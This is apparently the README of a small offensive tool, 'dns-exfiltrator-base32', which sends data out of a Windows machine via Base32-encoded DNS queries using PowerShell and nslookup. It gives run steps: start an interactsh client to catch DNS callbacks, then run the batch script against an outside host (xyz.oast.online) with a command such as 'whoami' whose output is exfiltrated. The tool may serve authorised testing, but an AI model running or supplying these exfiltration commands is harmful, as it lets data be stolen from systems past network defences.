# dns-exfiltrator-base32
Exfiltrate data with DNS queries in Base32. Based on Powershell and NSLookup.

# How to Run
Download, unpack, give necessary permissions, and run the latest interact.sh client.

```
chmod +x interactsh-client
./interactsh-client -dns-only -json -o interactsh.json
```
Open the Command Prompt where you saved the batch script and run the following command:
```
dns-exfil-base32.bat xyz.oast.online "whoami"
```
